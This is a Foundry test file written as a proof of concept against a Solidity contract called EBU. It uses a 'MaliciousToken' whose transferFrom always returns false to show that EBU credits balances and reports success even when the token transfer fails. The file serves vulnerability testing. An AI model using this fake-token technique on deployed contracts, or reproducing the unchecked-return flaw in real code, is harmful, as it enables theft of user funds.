// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xa46edd6a9a93feec36576ee5048146870ea2c3ae.sol";

contract EBUTest is Test {
    EBU ebu;
    address owner = address(0x1);
    MaliciousToken maliciousToken;

    function setUp() public {
        vm.startPrank(owner);
        ebu = new EBU();
        maliciousToken = new MaliciousToken();
        ebu.authorizeToken(address(maliciousToken));
        vm.stopPrank();
    }

    function testUncheckedLowLevelCall() public {
        address[] memory recipients = new address[](1);
        recipients[0] = address(this);
        
        uint[] memory amounts = new uint[](1);
        amounts[0] = 100;

        console.log("--- BEFORE-Trigger ---");
        uint initialBalance = ebu.getUserBalance(address(this));
        uint totalTransfersBefore = ebu.totalTransfers();
        console.log("Initial balance:", initialBalance);
        console.log("Total transfers before:", totalTransfersBefore);

        console.log("--- Trigger Transfer ---");
        bool success = ebu.transfer(owner, address(maliciousToken), recipients, amounts);
        console.log("Transfer function returned:", success);

        console.log("--- AFTER-Trigger ---");
        uint newBalance = ebu.getUserBalance(address(this));
        uint totalTransfersAfter = ebu.totalTransfers();
        console.log("New balance:", newBalance);
        console.log("Total transfers after:", totalTransfersAfter);

        console.log("--- Verdict ---");
        bool balanceUpdatedIllegally = (newBalance == initialBalance + amounts[0]);
        bool transfersIncreased = (totalTransfersAfter == totalTransfersBefore + 1);
        bool returnsSuccessDespiteFailure = success;

        if (balanceUpdatedIllegally && transfersIncreased && returnsSuccessDespiteFailure) {
            console.log("Vulnerability Exists: State updated and returned true despite failed token transfer");
        } else {
            console.log("Vulnerability not Exist: State not improperly updated or returned false");
        }
        
        assertEq(newBalance, initialBalance + amounts[0], "Balance should increase despite failed transfer");
        assertTrue(success, "Function returns true despite failed transfers");
    }
}

contract MaliciousToken {
    function transferFrom(address, address, uint256) external pure returns (bool) {
        return false;
    }
}